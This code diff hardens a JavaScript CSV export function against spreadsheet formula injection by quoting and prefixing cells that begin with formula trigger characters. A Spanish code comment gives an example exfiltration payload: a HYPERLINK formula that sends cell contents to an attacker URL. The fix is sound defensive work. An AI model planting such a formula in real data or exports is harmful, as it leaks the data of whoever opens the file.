@@ -127,10 +127,18 @@ export function paginate(list, page, pageSize) {
 export function csvCell(value) {
   if (value === undefined || value === null) return '';
   const str = String(value);
-  if (/[",;\r\n]/.test(str)) {
-    return `"${str.replace(/"/g, '""')}"`;
+  // BUG-225 (codex MEDIUM, 2026-05-18): prefijar con `'` si el cell empieza
+  // con un formula trigger (`=`, `+`, `-`, `@`, tab, CR). Sin esto, Excel/
+  // LibreOffice/Sheets interpretan el cell como fórmula al abrir el CSV —
+  // un contacto malicioso podía setear su WhatsApp display_name a
+  // `=HYPERLINK("https://attacker/?x="&A1,"click")` y exfiltrar al
+  // staff/viewer que exporte y abra el archivo.
+  const dangerous = str.length > 0 && '=+-@\t\r'.includes(str[0]);
+  const prefixed = dangerous ? `'${str}` : str;
+  if (/[",;\r\n]/.test(prefixed) || dangerous) {
+    return `"${prefixed.replace(/"/g, '""')}"`;
   }
-  return str;
+  return prefixed;
 }
 
 /**
